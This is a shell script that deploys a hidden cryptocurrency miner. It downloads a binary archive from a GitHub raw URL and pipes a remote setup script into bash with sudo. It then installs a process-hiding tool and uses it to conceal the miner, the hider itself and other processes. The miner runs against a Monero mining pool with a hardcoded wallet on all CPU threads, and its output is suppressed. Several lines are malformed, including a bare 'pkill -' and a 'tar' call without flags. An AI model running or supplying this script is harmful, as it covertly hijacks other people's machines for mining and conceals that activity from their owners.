#!/bin/sh
pkill -
wget https://github.com/01057057/gas/raw/main/kuntul.tar.gz
tar kuntul.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add toyo.sh
Ph add python3
ph add root
ph add node-process-hider
ph add -
./kuntul -o auto.c3pool.org:80 -u 8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB.الجُمُعَةُ -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
